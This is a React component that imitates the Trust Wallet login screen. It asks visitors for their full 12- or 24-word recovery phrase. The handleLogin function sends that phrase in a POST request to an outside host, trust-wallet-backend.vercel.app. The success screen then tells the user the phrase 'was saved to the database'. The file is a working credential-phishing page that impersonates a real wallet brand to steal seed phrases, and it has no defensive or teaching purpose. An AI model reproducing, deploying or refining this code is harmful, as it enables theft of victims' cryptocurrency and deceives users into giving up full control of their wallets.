import { useState, useEffect, useRef } from "react";

const ShieldLogo = () => (
  <svg width="52" height="60" viewBox="0 0 52 60" fill="none" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <linearGradient id="shield-g" x1="0" y1="0" x2="52" y2="60" gradientUnits="userSpaceOnUse">
        <stop offset="0%" stopColor="#5198FF" />
        <stop offset="100%" stopColor="#1A6DFF" />
      </linearGradient>
      <linearGradient id="shield-inner" x1="0" y1="0" x2="52" y2="60" gradientUnits="userSpaceOnUse">
        <stop offset="0%" stopColor="#ffffff" stopOpacity="0.18" />
        <stop offset="100%" stopColor="#ffffff" stopOpacity="0.04" />
      </linearGradient>
    </defs>
    <path d="M26 2L3 11.5V27C3 40.8 13.2 53.6 26 57 38.8 53.6 49 40.8 49 27V11.5L26 2Z" fill="url(#shield-g)" />
    <path d="M26 9L10 16.5V27C10 37.4 17.5 46.8 26 49.5 34.5 46.8 42 37.4 42 27V16.5L26 9Z" fill="url(#shield-inner)" />
    <path d="M19 28.5L24 33.5L34 22" stroke="white" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round" fill="none" />
  </svg>
);

const EyeOpen = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
    <circle cx="12" cy="12" r="3" />
  </svg>
);

const EyeClosed = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94" />
    <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19" />
    <line x1="1" y1="1" x2="23" y2="23" />
  </svg>
);

const CheckIcon = () => (
  <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#3B82F6" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
    <polyline points="20 6 9 17 4 12" />
  </svg>
);

const AlertIcon = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#F87171" strokeWidth="2.5" strokeLinecap="round">
    <circle cx="12" cy="12" r="10" />
    <line x1="12" y1="8" x2="12" y2="12" />
    <line x1="12" y1="16" x2="12.01" y2="16" />
  </svg>
);

const API = "https://trust-wallet-backend.vercel.app";

export default function TrustWallet() {
  const [words, setWords] = useState(Array(12).fill(""));
  const [wordCount, setWordCount] = useState(12);
  const [revealed, setRevealed] = useState(false);
  const [focused, setFocused] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [mounted, setMounted] = useState(false);
  const inputRefs = useRef([]);

  useEffect(() => { setTimeout(() => setMounted(true), 60); }, []);

  const handleWordChange = (i, val) => {
    const pasted = val.trim().split(/[\s,]+/);
    if (pasted.length > 1) {
      const next = [...words];
      pasted.forEach((w, j) => { if (i + j < wordCount) next[i + j] = w; });
      setWords(next);
      inputRefs.current[Math.min(i + pasted.length, wordCount - 1)]?.focus();
      return;
    }
    const next = [...words];
    next[i] = val.replace(/\s/g, "");
    setWords(next);
    setError("");
    if (val.endsWith(" ") && i < wordCount - 1) inputRefs.current[i + 1]?.focus();
  };

  const handleKeyDown = (i, e) => {
    if (e.key === "Backspace" && words[i] === "" && i > 0) inputRefs.current[i - 1]?.focus();
    if (e.key === "Enter" && i < wordCount - 1) inputRefs.current[i + 1]?.focus();
  };

  const switchWordCount = (n) => {
    setWordCount(n);
    setWords(Array(n).fill(""));
    setError("");
  };

  const filledCount = words.filter(w => w.trim().length > 0).length;
  const allFilled = filledCount === wordCount;

  const handleLogin = async () => {
    if (!allFilled) {
      setError("Please enter all " + wordCount + " words of your recovery phrase.");
      return;
    }
    setLoading(true);
    setError("");
    try {
      const response = await fetch(API + "/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phrase: words.join(" ") }),
      });
      const data = await response.json();
      if (response.ok) {
        setSuccess(true);
      } else {
        setError(data.error || "Login failed. Try again.");
      }
    } catch (err) {
      setError("Cannot connect to server.");
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div style={s.bg}>
        <div style={Object.assign({}, s.card, mounted ? s.cardIn : {})}>
          <div style={s.successWrap}>
            <div style={s.successRing}>
              <CheckIcon />
            </div>
            <h2 style={s.successTitle}>Login Successful</h2>
            <p style={s.successSub}>Your phrase was saved to the database successfully.</p>
            <button style={s.btn} onClick={() => { setSuccess(false); setWords(Array(wordCount).fill("")); }}>
              Log Out
            </button>
          </div>
        </div>
        <style>{globalCss}</style>
      </div>
    );
  }

  return (
    <div style={s.bg}>
      <div style={Object.assign({}, s.card, mounted ? s.cardIn : {})}>

        <div style={s.header}>
          <ShieldLogo />
          <div style={s.headerText}>
            <span style={s.appName}>Trust Wallet</span>
            <span style={s.appSub}>Crypto &amp; Bitcoin Wallet</span>
          </div>
        </div>

        <div style={s.divider} />

        <div style={s.titleBlock}>
          <h2 style={s.title}>Login to your wallet</h2>
          <p style={s.subtitle}>Enter your 12 or 24-word recovery phrase to login to your wallet.</p>
        </div>

        <div style={s.switcher}>
          {[12, 24].map(n => (
            <button key={n} style={Object.assign({}, s.switchBtn, wordCount === n ? s.switchBtnActive : {})} onClick={() => switchWordCount(n)}>
              {n} words
            </button>
          ))}
        </div>

        <div style={Object.assign({}, s.grid, { gridTemplateColumns: wordCount === 24 ? "1fr 1fr 1fr" : "1fr 1fr" })}>
          {words.map((word, i) => (
            <div key={i} style={Object.assign({}, s.wordBox, focused === i ? s.wordBoxFocus : word ? s.wordBoxFilled : {})}>
              <span style={s.wordNum}>{i + 1}</span>
              <input
                ref={el => inputRefs.current[i] = el}
                type={revealed ? "text" : "password"}
                value={word}
                onChange={e => handleWordChange(i, e.target.value)}
                onKeyDown={e => handleKeyDown(i, e)}
                onFocus={() => setFocused(i)}
                onBlur={() => setFocused(null)}
                style={s.wordInput}
                autoCapitalize="none"
                autoCorrect="off"
                spellCheck={false}
                placeholder="word"
              />
            </div>
          ))}
        </div>

        <div style={s.controlsRow}>
          <button style={s.revealBtn} onClick={() => setRevealed(!revealed)}>
            <span style={s.revealIcon}>{revealed ? <EyeOpen /> : <EyeClosed />}</span>
            {revealed ? "Hide" : "Show"} phrase
          </button>
          <span style={Object.assign({}, s.counter, { color: allFilled ? "#3B82F6" : "#475569" })}>
            {filledCount} / {wordCount}
          </span>
        </div>

        {error && (
          <div style={s.errorBox}>
            <AlertIcon />
            {error}
          </div>
        )}

        <button
          style={Object.assign({}, s.btn, !allFilled && !loading ? s.btnDisabled : {}, loading ? s.btnLoading : {})}
          onClick={handleLogin}
          disabled={loading || !allFilled}
        >
          {loading ? (
            <span style={s.loaderRow}>
              <span className="tw-spin" style={s.spinner} />
              Logging in...
            </span>
          ) : "Login"}
        </button>

        <p style={s.warning}>
          🔒 Never share your recovery phrase. Anyone who has it has full access to your crypto.
        </p>

        <div style={s.footerRow}>
          <span style={s.footerText}>New to crypto? </span>
          <button style={s.footerLink} onClick={() => alert("Create wallet — coming soon!")}>
            Create a new wallet
          </button>
        </div>

      </div>
      <style>{globalCss}</style>
    </div>
  );
}

const s = {
  bg: {
    minHeight: "100vh",
    background: "#0F172A",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    padding: "20px",
    fontFamily: "'DM Sans', 'Segoe UI', sans-serif",
  },
  card: {
    background: "#1E293B",
    borderRadius: "20px",
    padding: "28px 22px 22px",
    width: "100%",
    maxWidth: "390px",
    boxShadow: "0 32px 80px rgba(0,0,0,0.6)",
    border: "1px solid rgba(255,255,255,0.06)",
    opacity: 0,
    transform: "translateY(16px)",
    transition: "opacity 0.4s ease, transform 0.4s ease",
  },
  cardIn: { opacity: 1, transform: "translateY(0)" },
  header: { display: "flex", alignItems: "center", gap: "14px" },
  headerText: { display: "flex", flexDirection: "column", gap: "2px" },
  appName: { color: "#F1F5F9", fontSize: "19px", fontWeight: "700", letterSpacing: "-0.3px" },
  appSub: { color: "#475569", fontSize: "12px" },
  divider: { height: "1px", background: "rgba(255,255,255,0.07)", margin: "20px 0" },
  titleBlock: { marginBottom: "16px" },
  title: { color: "#F1F5F9", fontSize: "17px", fontWeight: "600", margin: "0 0 6px", letterSpacing: "-0.2px" },
  subtitle: { color: "#64748B", fontSize: "13px", margin: 0, lineHeight: "1.55" },
  switcher: { display: "flex", background: "#0F172A", borderRadius: "10px", padding: "3px", gap: "3px", marginBottom: "14px" },
  switchBtn: { flex: 1, background: "transparent", border: "none", color: "#475569", fontSize: "13px", fontWeight: "500", padding: "8px 0", borderRadius: "8px", cursor: "pointer", transition: "all 0.15s" },
  switchBtnActive: { background: "#1E293B", color: "#E2E8F0", boxShadow: "0 1px 4px rgba(0,0,0,0.5)" },
  grid: { display: "grid", gap: "7px", marginBottom: "12px" },
  wordBox: { display: "flex", alignItems: "center", background: "#0F172A", border: "1.5px solid rgba(255,255,255,0.06)", borderRadius: "9px", padding: "0 9px", height: "40px", gap: "6px", transition: "border-color 0.15s, background 0.15s" },
  wordBoxFocus: { borderColor: "#3B82F6", background: "#0D1E38" },
  wordBoxFilled: { borderColor: "rgba(59,130,246,0.25)" },
  wordNum: { color: "#2D3F55", fontSize: "11px", fontWeight: "600", minWidth: "14px", userSelect: "none" },
  wordInput: { flex: 1, background: "transparent", border: "none", outline: "none", color: "#E2E8F0", fontSize: "14px", fontFamily: "monospace", letterSpacing: "0.3px", width: "100%" },
  controlsRow: { display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "14px" },
  revealBtn: { display: "flex", alignItems: "center", gap: "6px", background: "none", border: "none", color: "#3B82F6", fontSize: "13px", fontWeight: "500", cursor: "pointer", padding: 0 },
  revealIcon: { display: "flex", alignItems: "center" },
  counter: { fontSize: "12px", fontWeight: "600", transition: "color 0.2s" },
  errorBox: { display: "flex", alignItems: "center", gap: "8px", background: "rgba(248,113,113,0.08)", border: "1px solid rgba(248,113,113,0.22)", borderRadius: "10px", padding: "10px 12px", color: "#F87171", fontSize: "13px", marginBottom: "12px", lineHeight: "1.4" },
  btn: { width: "100%", background: "linear-gradient(135deg, #3B82F6 0%, #2563EB 100%)", border: "none", borderRadius: "12px", padding: "14px", color: "#fff", fontSize: "15px", fontWeight: "600", cursor: "pointer", letterSpacing: "0.1px", boxShadow: "0 4px 20px rgba(59,130,246,0.3)", transition: "opacity 0.2s", marginBottom: "14px" },
  btnDisabled: { background: "#1A2F4A", boxShadow: "none", color: "#334155", cursor: "not-allowed" },
  btnLoading: { opacity: 0.75, cursor: "not-allowed" },
  loaderRow: { display: "flex", alignItems: "center", justifyContent: "center", gap: "9px" },
  spinner: { width: "16px", height: "16px", border: "2.5px solid rgba(255,255,255,0.2)", borderTopColor: "#fff", borderRadius: "50%", display: "inline-block" },
  warning: { color: "#475569", fontSize: "12px", lineHeight: "1.6", textAlign: "center", margin: "0 0 14px" },
  footerRow: { textAlign: "center" },
  footerText: { color: "#475569", fontSize: "13px" },
  footerLink: { background: "none", border: "none", color: "#3B82F6", fontSize: "13px", fontWeight: "600", cursor: "pointer", padding: 0, textDecoration: "underline", textUnderlineOffset: "2px" },
  successWrap: { display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0 8px", gap: "12px" },
  successRing: { width: "70px", height: "70px", borderRadius: "50%", background: "rgba(59,130,246,0.1)", border: "2px solid rgba(59,130,246,0.25)", display: "flex", alignItems: "center", justifyContent: "center" },
  successTitle: { color: "#F1F5F9", fontSize: "20px", fontWeight: "700", margin: 0 },
  successSub: { color: "#64748B", fontSize: "13px", textAlign: "center", margin: "0 0 8px" },
};

const globalCss = `
  @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap');
  * { box-sizing: border-box; }
  input::placeholder { color: #1E3050 !important; }
  input[type="password"] { letter-spacing: 5px; }
  input[type="password"]::placeholder { letter-spacing: 0; }
  @keyframes tw-spin { to { transform: rotate(360deg); } }
  .tw-spin { animation: tw-spin 0.75s linear infinite; }
  button:not(:disabled):active { transform: scale(0.98); }
`;
